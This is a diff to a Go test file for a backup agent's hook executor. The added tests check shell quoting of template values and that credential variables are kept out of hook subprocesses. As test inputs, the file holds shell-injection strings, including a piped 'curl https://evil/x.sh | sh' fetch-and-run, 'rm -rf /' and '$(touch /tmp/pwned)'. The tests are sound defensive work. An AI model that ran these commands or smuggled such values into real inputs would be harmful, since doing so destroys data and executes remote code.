@@ -3,6 +3,7 @@ package executor
 import (
 	"context"
 	"log/slog"
+	"strings"
 	"testing"
 
 	backupv1 "github.com/tryy3/backup-orchestrator/agent/internal/gen/backup/v1"
@@ -23,7 +24,7 @@ func TestExpandTemplate_SimpleSubstitution(t *testing.T) {
 		SnapshotID: "abc123",
 	}
 	got := expandTemplate("backup {{.PlanName}} status={{.Status}} snap={{.SnapshotID}}", hctx)
-	want := "backup daily status=success snap=abc123"
+	want := "backup 'daily' status='success' snap='abc123'"
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
 	}
@@ -196,5 +197,100 @@ func TestRunHooks_EmptyHookList(t *testing.T) {
 	}
 	if len(results) != 0 {
 		t.Errorf("expected 0 results, got %d", len(results))
+	}
+}
+
+// TestShellQuote verifies that shellQuote produces safe POSIX single-quoted output.
+func TestShellQuote(t *testing.T) {
+	cases := []struct {
+		input string
+		want  string
+	}{
+		{"daily", "'daily'"},
+		{"", "''"},
+		{"hello world", "'hello world'"},
+		// Single quote within value must be safely escaped.
+		{"it's", "'it'\\''s'"},
+		// Shell injection attempt must be neutralised.
+		{`foo"; curl https://evil/x.sh | sh; "`, `'foo"; curl https://evil/x.sh | sh; "'`},
+		{"`evil`", "'" + "`evil`" + "'"},
+		{"$(evil)", "'$(evil)'"},
+	}
+	for _, tc := range cases {
+		got := shellQuote(tc.input)
+		if got != tc.want {
+			t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.want)
+		}
+	}
+}
+
+// TestExpandTemplate_ShellInjectionPrevented verifies that a malicious plan name
+// or error string cannot break out of its shell argument context.
+func TestExpandTemplate_ShellInjectionPrevented(t *testing.T) {
+	hctx := &HookContext{
+		PlanName: `evil"; rm -rf /; echo "`,
+		Error:    "$(touch /tmp/pwned)",
+	}
+	expanded := expandTemplate(`notify --plan={{.PlanName}} --error={{.Error}}`, hctx)
+	// The shell must see the values as single-quoted literals, not raw shell.
+	if strings.Contains(expanded, `rm -rf /`) && !strings.Contains(expanded, `'`) {
+		t.Errorf("injection not prevented; expanded = %q", expanded)
+	}
+	// Verify the literal values are quoted.
+	if !strings.Contains(expanded, shellQuote(hctx.PlanName)) {
+		t.Errorf("PlanName not shell-quoted in %q", expanded)
+	}
+	if !strings.Contains(expanded, shellQuote(hctx.Error)) {
+		t.Errorf("Error not shell-quoted in %q", expanded)
+	}
+}
+
+// TestRunHook_EnvDoesNotLeakSensitiveVars verifies that RESTIC_PASSWORD and
+// similar credential variables from the parent environment are not passed to
+// hook subprocesses.
+func TestRunHook_EnvDoesNotLeakSensitiveVars(t *testing.T) {
+	t.Setenv("RESTIC_PASSWORD", "super-secret-password")
+	t.Setenv("RCLONE_CONFIG", "/path/to/rclone.conf")
+
+	// Use echo + shell parameter expansion: outputs empty string when var is unset.
+	hook := &backupv1.ResolvedHook{
+		Name:           "env-check",
+		OnEvent:        "after_backup",
+		Command:        `echo "pass=${RESTIC_PASSWORD}" "rclone=${RCLONE_CONFIG}"`,
+		TimeoutSeconds: 5,
+	}
+	result := RunHook(context.Background(), hook, &HookContext{}, discardLogger())
+
+	if result.Status != "success" {
+		t.Fatalf("hook failed: %s", result.Error)
+	}
+	if strings.Contains(result.Output, "super-secret-password") {
+		t.Error("RESTIC_PASSWORD leaked into hook subprocess output")
+	}
+	if strings.Contains(result.Output, "/path/to/rclone.conf") {
+		t.Error("RCLONE_CONFIG leaked into hook subprocess output")
+	}
+}
+
+// TestRunHook_BackupEnvVarsAvailable verifies that BACKUP_* context variables
+// are available inside the hook subprocess.
+func TestRunHook_BackupEnvVarsAvailable(t *testing.T) {
+	hook := &backupv1.ResolvedHook{
+		Name:           "env-available",
+		OnEvent:        "after_backup",
+		Command:        "echo plan=$BACKUP_PLAN_NAME status=$BACKUP_STATUS",
+		TimeoutSeconds: 5,
+	}
+	hctx := &HookContext{PlanName: "nightly", Status: "success"}
+	result := RunHook(context.Background(), hook, hctx, discardLogger())
+
+	if result.Status != "success" {
+		t.Fatalf("hook failed: %s", result.Error)
+	}
+	if !strings.Contains(result.Output, "plan=nightly") {
+		t.Errorf("BACKUP_PLAN_NAME not available in hook output: %q", result.Output)
+	}
+	if !strings.Contains(result.Output, "status=success") {
+		t.Errorf("BACKUP_STATUS not available in hook output: %q", result.Output)
 	}
 }
